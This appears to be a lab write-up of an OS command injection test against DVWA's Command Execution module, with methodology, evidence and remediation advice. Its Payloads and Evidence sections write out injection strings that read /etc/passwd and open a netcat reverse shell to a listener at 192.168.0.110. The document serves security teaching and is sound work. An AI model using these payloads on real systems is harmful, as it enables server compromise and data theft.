# Command Injection

## Vulnerability Overview

Command Injection occurs when user-controlled input is executed as part of an operating system command. Improper validation allows attackers to execute arbitrary commands on the server.

| Property | Value |
|----------|-------|
| **Vulnerability Type** | OS Command Injection |
| **Severity** | Critical |
| **CVSS v3.1** | 9.8 |
| **Affected Module** | DVWA – Command Execution |

---

## Objective

To verify whether user input can be used to execute operating system commands on the web server.

---

## Tools Used

- Kali Linux
- DVWA
- Burp Suite Community Edition
- Netcat
- Firefox Browser

---

## Methodology

1. Set DVWA Security Level to **Low**.
2. Navigate to the Command Execution module.
3. Capture the POST request using Burp Suite.
4. Modify the `ip` parameter with command injection payloads.
5. Forward the request.
6. Observe execution of injected commands.

---

## Payloads Used

### Identify Current User

```bash
127.0.0.1; whoami
```

### List Files

```bash
127.0.0.1; ls
```

### Read Sensitive File

```bash
127.0.0.1; cat /etc/passwd
```

### Reverse Shell

```bash
127.0.0.1; nc 192.168.0.110 4444 -e /bin/bash
```

---

## Evidence

### Test 1 – Command Execution

**Payload**

```bash
127.0.0.1; whoami
```

**Output**

```text
www-data
```

The application executed the injected command successfully.

**Screenshot**

![](screenshots/04-command-injection-whoami.png)

---

### Test 2 – Sensitive File Disclosure

**Payload**

```bash
127.0.0.1; cat /etc/passwd
```

**Result**

The server returned the contents of the `/etc/passwd` file, confirming arbitrary command execution.

**Screenshot**

![](screenshots/05-sensitive-file-read-passwd.png)

---

### Test 3 – Reverse Shell

**Netcat Listener**

```bash
nc -lvnp 4444
```

**Injected Payload**

```bash
127.0.0.1; nc 192.168.0.110 4444 -e /bin/bash
```

**Result**

A reverse shell connection was established successfully.

**Screenshot**

Listener

![](screenshots/06-netcat-listener.png)

Reverse Shell

![](screenshots/07-reverse-shell-established.png)

---

### HTTP Request Analysis

Burp Suite captured the POST request containing the injected payload.

**Screenshot**

![](screenshots/02-burp-intercept-post-request.png)

---

### HTTP Response Analysis

The application returned the output of executed operating system commands.

**Screenshot**

![](screenshots/03-repeater-original-request.png)

---

## Impact

An attacker can:

- Execute arbitrary operating system commands
- Read sensitive files
- Obtain a reverse shell
- Escalate privileges
- Compromise the underlying server
- Move laterally within the network

---

## Risk Rating

**Critical**

---

## Remediation

- Never concatenate user input into shell commands.
- Validate all user input using allow-lists.
- Use secure APIs instead of shell execution.
- Run web applications with the least privileges required.
- Disable unnecessary system binaries.
- Monitor logs for suspicious command execution.

---
